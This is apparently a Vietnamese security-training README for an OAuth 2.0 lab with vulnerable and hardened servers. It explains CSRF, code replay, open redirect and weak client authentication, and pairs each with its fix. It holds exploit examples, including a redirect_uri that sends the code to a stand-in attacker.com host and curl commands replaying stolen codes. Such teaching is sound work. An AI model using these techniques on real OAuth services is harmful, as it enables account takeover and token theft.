# OAuth 2.0 Authorization Code Grant - Demo & Security Testing

## 📋 Tổng quan

Project này triển khai **OAuth 2.0 Authorization Code Grant** với hai phiên bản:
1. **Phiên bản có lỗ hổng** - để demo các cuộc tấn công
2. **Phiên bản an toàn** - để demo cách phòng chống

## 🎯 Mục đích

- Hiểu rõ cách hoạt động của OAuth 2.0 Authorization Code Grant
- Nhận biết các lỗ hổng bảo mật phổ biến
- Học cách khai thác các lỗ hổng (cho mục đích học tập)
- Hiểu các biện pháp phòng chống

## 🏗️ Kiến trúc

```
┌─────────────────┐         ┌──────────────────────┐
│                 │         │                      │
│  User (Browser) │◄───────►│  Client Application  │
│                 │         │  (Port 3002/3004)    │
└─────────────────┘         └──────────┬───────────┘
                                       │
                                       │ OAuth 2.0
                                       │ Flow
                                       │
                            ┌──────────▼────────────┐
                            │                       │
                            │  Authorization Server │
                            │  (Port 3001/3003)     │
                            │                       │
                            └───────────────────────┘
```

## 📁 Cấu trúc Files

```
oauth-demo/
├── vulnerable-auth-server.js   # Authorization Server có lỗ hổng
├── vulnerable-client.js         # Client Application có lỗ hổng
├── secure-auth-server.js        # Authorization Server an toàn
├── secure-client.js             # Client Application an toàn
├── attack-demonstrations.js     # Scripts demo tấn công
├── README.md                    # File này
└── package.json
```

## 🚀 Cài đặt và Chạy

### Bước 1: Cài đặt dependencies

```bash
npm install
```

### Bước 2: Chạy phiên bản VULNERABLE

**Terminal 1 - Authorization Server:**
```bash
node vulnerable-auth-server.js
```
Server chạy tại: http://localhost:3001

**Terminal 2 - Client Application:**
```bash
node vulnerable-client.js
```
Client chạy tại: http://localhost:3002

### Bước 3: Chạy phiên bản SECURE

**Terminal 3 - Authorization Server:**
```bash
node secure-auth-server.js
```
Server chạy tại: http://localhost:3003
⚠️ Lưu ý CLIENT_SECRET hiển thị trong console!

**Terminal 4 - Client Application:**
```bash
# Trước khi chạy, update CLIENT_SECRET trong secure-client.js
# Lấy giá trị từ output của secure-auth-server.js

node secure-client.js
```
Client chạy tại: http://localhost:3004

### Bước 4: Chạy Attack Demonstrations

```bash
node attack-demonstrations.js
```

## 🎓 Hướng dẫn Test

### Test Flow Bình thường

1. Mở browser tới http://localhost:3002 (vulnerable) hoặc http://localhost:3004 (secure)
2. Click "Login with OAuth"
3. Nhập credentials:
   - Email: `user@example.com`
   - Password: `password123`
4. Click "Login & Authorize"
5. Quan sát kết quả

### Test Các Cuộc Tấn công

## ⚠️ LỖ HỔNG TRONG PHIÊN BẢN VULNERABLE

### 1. CSRF Attack (No State Parameter)

**Mô tả:** Client không sử dụng state parameter, dễ bị tấn công CSRF.

**Cách khai thác:**
1. Tạo malicious authorization URL:
```
http://localhost:3001/login?client_id=client-vulnerable-app&redirect_uri=http://localhost:3002/callback&response_type=code&scope=profile%20email
```

2. Gửi URL này cho victim (qua email, social media, etc.)
3. Khi victim click và authorize, account sẽ được link với session của attacker

**Impact:** 
- Attacker có thể access dữ liệu của victim
- Account takeover
- Unauthorized actions

**Cách phòng chống:**
- Sử dụng state parameter
- Validate state khi nhận callback
- State phải random và tied to user session

---

### 2. Authorization Code Interception

**Mô tả:** Authorization code có thể bị đánh cắp qua redirect URL.

**Cách khai thác:**
1. Intercept network traffic (WiFi công cộng, MITM attack)
2. Lấy authorization code từ redirect URL
3. Sử dụng code để lấy access token

**Impact:**
- Unauthorized access token generation
- Account access

**Cách phòng chống:**
- Sử dụng HTTPS
- PKCE (Proof Key for Code Exchange)
- Short-lived codes (< 10 minutes)

---

### 3. Code Replay Attack

**Mô tả:** Authorization code có thể sử dụng nhiều lần.

**Cách khai thác:**
1. Lấy authorization code đã được sử dụng
2. Gọi token endpoint với code đó
3. Nhận access token mới

**Demo:**
```bash
# Lần 1 - Legitimate
curl -X POST http://localhost:3001/token \
  -H "Content-Type: application/json" \
  -d '{
    "grant_type": "authorization_code",
    "code": "YOUR-CODE-HERE",
    "redirect_uri": "http://localhost:3002/callback",
    "client_id": "client-vulnerable-app",
    "client_secret": "secret-123"
  }'

# Lần 2 - Attack (same code)
curl -X POST http://localhost:3001/token \
  -H "Content-Type: application/json" \
  -d '{
    "grant_type": "authorization_code",
    "code": "YOUR-CODE-HERE",
    "redirect_uri": "http://localhost:3002/callback",
    "client_id": "client-vulnerable-app",
    "client_secret": "secret-123"
  }'
```

**Impact:**
- Multiple access tokens cho cùng một authorization
- Security breach

**Cách phòng chống:**
- Enforce one-time use
- Invalidate code sau khi dùng
- Revoke tokens nếu phát hiện reuse

---

### 4. Open Redirect Attack

**Mô tả:** Server không validate redirect_uri, cho phép redirect tới bất kỳ URL nào.

**Cách khai thác:**
1. Tạo authorization URL với malicious redirect_uri:
```
http://localhost:3001/login?client_id=client-vulnerable-app&redirect_uri=https://attacker.com/steal&response_type=code
```

2. Victim authorize
3. Code được gửi tới attacker.com
4. Attacker lấy code và exchange cho token

**Impact:**
- Code theft
- Phishing attacks
- Account compromise

**Cách phòng chống:**
- Whitelist redirect URIs
- Exact string matching
- No wildcards

---

### 5. Weak Client Authentication

**Mô tả:** Server không verify client_id và client_secret đúng cách.

**Cách khai thác:**
```bash
# Có thể exchange code mà không cần valid client credentials
curl -X POST http://localhost:3001/token \
  -H "Content-Type: application/json" \
  -d '{
    "grant_type": "authorization_code",
    "code": "STOLEN-CODE",
    "redirect_uri": "http://localhost:3002/callback",
    "client_id": "any-client-id",
    "client_secret": "any-secret"
  }'
```

**Impact:**
- Unauthorized token generation
- Client impersonation

**Cách phòng chống:**
- Strict client authentication
- Verify client credentials
- Use client certificates (for high security)

---

### 6. No Token Expiration

**Mô tả:** Access tokens không có thời gian hết hạn.

**Impact:**
- Tokens valid vô thời hạn
- Increased risk nếu token bị compromise
- No way to revoke access naturally

**Cách phòng chống:**
- Set token expiration (1 hour recommended)
- Implement refresh tokens
- Token rotation

---

### 7. Insecure Token Storage

**Mô tả:** Tokens được lưu trữ dạng plain text.

**Impact:**
- Token theft from memory dumps
- Easy access for attackers
- No protection at rest

**Cách phòng chống:**
- Encrypt tokens before storage
- Use secure storage mechanisms
- Clear tokens when no longer needed

---

## ✅ BIỆN PHÁP BẢO MẬT TRONG PHIÊN BẢN SECURE

### 1. State Parameter Implementation
```javascript
// Generate cryptographically random state
const state = crypto.randomBytes(32).toString('hex');

// Store with expiration
pendingStates.set(state, {
    createdAt: Date.now(),
    expiresAt: Date.now() + 5 * 60 * 1000
});

// Validate on callback
if (!pendingStates.has(state)) {
    return error('Invalid state - possible CSRF attack');
}
```

### 2. Redirect URI Whitelist
```javascript
const clients = {
    'client-secure-app': {
        redirect_uris: [
            'http://localhost:3004/callback'  // Exact match only
        ]
    }
};

function validateRedirectUri(clientId, redirectUri) {
    return clients[clientId].redirect_uris.includes(redirectUri);
}
```

### 3. One-Time Authorization Codes
```javascript
// Check if code already used
if (authCode.used) {
    authorizationCodes.delete(code);
    // Revoke all tokens issued with this code
    return error('Code already used - security breach');
}

// Mark as used
authCode.used = true;
```

### 4. Code Expiration
```javascript
const expiresAt = Date.now() + 10 * 60 * 1000; // 10 minutes

if (Date.now() > authCode.expiresAt) {
    return error('Code expired');
}
```

### 5. Token Expiration
```javascript
const accessToken = jwt.sign(payload, secret, {
    expiresIn: '1h'
});
```

### 6. Encrypted Token Storage
```javascript
// Encrypt before storing
const encryptedToken = encrypt(accessToken);

sessions.set(sessionId, {
    encrypted_token: encryptedToken,
    // ... other data
});

// Decrypt only when needed
const accessToken = decrypt(session.encrypted_token);
```

### 7. Audit Logging
```javascript
function logAudit(action, details) {
    auditLog.push({
        timestamp: new Date().toISOString(),
        action,
        details
    });
}
```

## 📊 So sánh Vulnerable vs Secure

| Feature | Vulnerable | Secure |
|---------|-----------|---------|
| State Parameter | ❌ Not used | ✅ Required (min 16 chars) |
| Redirect URI Validation | ❌ No validation | ✅ Strict whitelist |
| Code Reuse Prevention | ❌ Can be reused | ✅ One-time use |
| Code Expiration | ❌ No expiration | ✅ 10-minute TTL |
| Client Authentication | ❌ Weak | ✅ Strict verification |
| Token Expiration | ❌ No expiration | ✅ 1-hour expiration |
| Token Storage | ❌ Plain text | ✅ Encrypted (AES-256) |
| Audit Logging | ❌ Basic | ✅ Comprehensive |

## 🔬 Lab Exercises

### Exercise 1: CSRF Attack
1. Start vulnerable servers
2. Craft malicious authorization URL
3. Test in incognito window
4. Document the attack flow
5. Try same attack on secure version
6. Document why it fails

### Exercise 2: Code Interception
1. Complete normal OAuth flow
2. Capture authorization code from URL
3. Try to reuse the code
4. Observe differences between vulnerable/secure

### Exercise 3: Open Redirect
1. Modify redirect_uri in authorization request
2. Attempt to redirect to external domain
3. Document results on both versions

### Exercise 4: Token Analysis
1. Obtain access token from both versions
2. Analyze token structure (JWT)
3. Check expiration claims
4. Compare security properties

## 📸 Screenshots Guide

Khi làm báo cáo, cần chụp các screenshots sau:

### Vulnerable Version
1. **Normal Flow:**
   - Client homepage
   - Authorization page
   - Callback success page (showing exposed token)

2. **CSRF Attack:**
   - Malicious authorization URL
   - Authorization without state validation
   - Successful attack result

3. **Code Replay:**
   - First token exchange
   - Second token exchange with same code
   - Both successful (vulnerability proof)

4. **Open Redirect:**
   - Authorization request with malicious redirect_uri
   - Acceptance of invalid redirect_uri
   - Code sent to attacker domain

### Secure Version
1. **Normal Flow:**
   - Client homepage with security badges
   - Authorization with state parameter
   - Callback success (token encrypted)

2. **Failed CSRF:**
   - Authorization without state
   - Error: "State parameter required"

3. **Failed Code Replay:**
   - First exchange successful
   - Second exchange error: "Code already used"

4. **Failed Open Redirect:**
   - Invalid redirect_uri error
   - Request rejected

## 📝 Báo cáo Khai thác

Template cho báo cáo chi tiết:

```markdown
# BÁO CÁO KHAI THÁC LỖ HỔNG OAUTH 2.0

## 1. THÔNG TIN CHUNG
- Tên lỗ hổng: [Tên]
- Mức độ nghiêm trọng: [Critical/High/Medium/Low]
- Loại tấn công: [CSRF/Code Interception/etc.]
- Ngày thực hiện: [Date]

## 2. MÔ TẢ LỖ HỔNG
[Chi tiết về lỗ hổng]

## 3. ĐIỀU KIỆN KHAI THÁC
- Yêu cầu: [Các điều kiện cần]
- Công cụ sử dụng: [Browser/Burp Suite/curl/etc.]

## 4. CÁC BƯỚC KHAI THÁC
1. [Bước 1 với screenshot]
2. [Bước 2 với screenshot]
3. [...]

## 5. BẰNG CHỨNG
- [Screenshots]
- [Network captures]
- [Logs]

## 6. TÁC ĐỘNG
- [Mô tả impact]
- [Potential damage]

## 7. BIỆN PHÁP PHÒNG CHỐNG
- [Cách fix]
- [Best practices]

## 8. DEMO TRÊN PHIÊN BẢN AN TOÀN
- [Kết quả khi thử tấn công trên secure version]
- [Tại sao không thành công]
```

## 🛡️ Best Practices

### For Authorization Server
1. Always validate redirect_uri against whitelist
2. Require and validate state parameter
3. Enforce one-time use of authorization codes
4. Set short expiration for codes (< 10 minutes)
5. Implement strict client authentication
6. Use HTTPS only
7. Implement rate limiting
8. Audit log all authentication events

### For Client Application
1. Always use state parameter
2. Generate cryptographically random state
3. Validate state on callback
4. Store tokens securely (encrypted)
5. Clear tokens on logout
6. Handle errors appropriately
7. Don't log sensitive data
8. Implement session timeout

### General Security
1. Use HTTPS everywhere
2. Implement PKCE for public clients
3. Regular security audits
4. Keep dependencies updated
5. Follow OAuth 2.0 Security Best Current Practice
6. Implement proper error handling
7. Use short-lived tokens
8. Implement token refresh mechanism

## 📚 Tài liệu Tham khảo

1. [RFC 6749 - OAuth 2.0 Framework](https://tools.ietf.org/html/rfc6749)
2. [RFC 6819 - OAuth 2.0 Threat Model](https://tools.ietf.org/html/rfc6819)
3. [OAuth 2.0 Security Best Current Practice](https://tools.ietf.org/html/draft-ietf-oauth-security-topics)
4. [OWASP OAuth Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)

## ⚠️ Disclaimer

Project này chỉ dùng cho mục đích học tập và nghiên cứu. Không sử dụng các kỹ thuật này để tấn công các hệ thống thực tế mà không có phép. Việc tấn công hệ thống không được phép là vi phạm pháp luật.

## 👥 Credits

- Developed for: GIAO Security Training
- Task: OAuth 2.0 Implementation & Exploitation Demo
- Team Members: Bin, Khánh, Bảo, Khôi

## 📞 Support

Nếu có câu hỏi hoặc gặp vấn đề, hãy:
1. Kiểm tra lại hướng dẫn
2. Xem logs trong console
3. Kiểm tra ports không bị conflict
4. Đảm bảo tất cả dependencies đã cài đặt

---

**Happy Hacking! 🔐**
